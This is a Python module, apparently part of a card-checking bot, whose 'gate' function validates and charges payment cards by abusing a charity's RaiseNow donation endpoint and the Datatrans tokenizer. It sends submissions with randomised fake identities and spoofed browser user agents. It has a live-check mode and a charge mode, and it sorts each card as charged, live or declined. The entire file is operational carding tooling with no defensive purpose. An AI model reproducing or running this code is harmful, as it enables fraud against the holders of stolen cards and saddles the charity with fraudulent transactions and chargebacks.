import requests
import json
import logging
import random
import string
import time

# --- UTILITY FUNCTIONS (Copied from main bot file for self-containment) ---
logger = logging.getLogger(__name__)

def generate_random_string(length=8):
    """Generates a random string of characters."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def random_email():
    """Generates a random email address."""
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
    domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    return f"{prefix}@{domain}.com"

def random_birth_day():
    """Generates a random day for birthday (1-28)."""
    return str(random.randint(1, 28)).zfill(2)

def random_birth_month():
    """Generates a random month for birthday (1-12)."""
    return str(random.randint(1, 12)).zfill(2)

def random_birth_year():
    """Generates a random year for birthday (1970-2005)."""
    return str(random.randint(1970, 2005))

def random_user_agent():
    """Generates a random realistic User-Agent string."""
    chrome_major = random.randint(100, 125)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    win_major = random.randint(10, 11)
    win_minor = random.randint(0, 3)
    win_build = random.randint(10000, 22631)
    win_patch = random.randint(0, 500)
    webkit_major = random.randint(537, 605)
    webkit_minor = random.randint(36, 99)
    safari_version = f"{webkit_major}.{webkit_minor}"
    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
    win_version = f"{win_major}.{win_minor}; Win64; x64"
    return (
        f"Mozilla/5.0 (Windows NT {win_version}) "
        f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
        f"Chrome/{chrome_version} Safari/{safari_version}"
    )

def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
            time.sleep(wait_time)
    
    final_error_message = f"Retry: All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

# --- MAIN GATE CHECKER FUNCTION ---
def check_card_gate1(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate_mode_func, get_charge_value_func, custom_charge_amount=None):
    """Logic for Gate 1 - Charge or Live Check Mode"""
    gate1_mode = get_gate_mode_func()
    try:
        user_agent = random_user_agent()
        
        # Random personal info
        first_name = generate_random_string(random.randint(12, 20))
        last_name = generate_random_string(random.randint(10, 20))
        cardholder = f"{first_name} {last_name}"
        email = random_email()
        birth_day = random_birth_day()
        birth_month = random_birth_month()
        birth_year = random_birth_year()

        # Step 1: Tokenize card
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250806042656273071",
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877",
            "browserUserAgent": user_agent,
            "browserJavaEnabled": "false",
            "browserLanguage": "vi-VN",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info

        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}):
                 return 'decline', line, token_data["error"]["message"], bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, "Tokenize response was not JSON", bin_info

        # Step 2: Make request based on mode
        payment_headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/",
            "User-Agent": user_agent
        }
        
        base_payload = {
            "account_uuid": "01bd7c99-eefc-42d2-91e4-4a020f6b5cfc",
            "test_mode": False,
            "create_supporter": False,
            "supporter": {
                "locale": "en",
                "first_name": first_name,
                "last_name": last_name,
                "email": email,
                "birth_day": birth_day,
                "birth_month": birth_month,
                "birth_year": birth_year
            },
            "raisenow_parameters": {
                "analytics": {"channel": "paylink", "user_agent": user_agent},
                "solution": {"uuid": "75405349-f0b9-4bed-9d28-df297347f272", "name": "Patenschaft Hundeabteilung", "type": "donate"},
                "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/ynddy?lng=en", "uuid": "self-service", "version": "2.16.0"}
            },
            "payment_information": {
                "brand_code": "eca",
                "cardholder": cardholder,
                "expiry_month": mes.zfill(2),
                "expiry_year": ano,
                "transaction_id": transaction_id
            },
            "profile": "110885c2-a1e8-47b7-a2af-525ad6ab8ca6",
            "return_url": "https://donate.raisenow.io/ynddy?lng=en&rnw-view=payment_result",
        }

        # --- CHARGE MODE ---
        if gate1_mode == 'charge':
            charge_value = get_charge_value_func('1', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments" # Charge endpoint
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": charge_value}
            # Remove subscription part for charge mode
            payment_payload.pop("subscription", None)

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info
        
        # --- LIVE CHECK MODE (ORIGINAL LOGIC) ---
        else:
            payment_url = "https://api.raisenow.io/payment-sources" # Live check endpoint
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": 50}
            payment_payload["subscription"] = { "recurring_interval": "6 * *", "timezone": "Asia/Bangkok" }

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate 1 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 1 System Error: {e}", bin_info
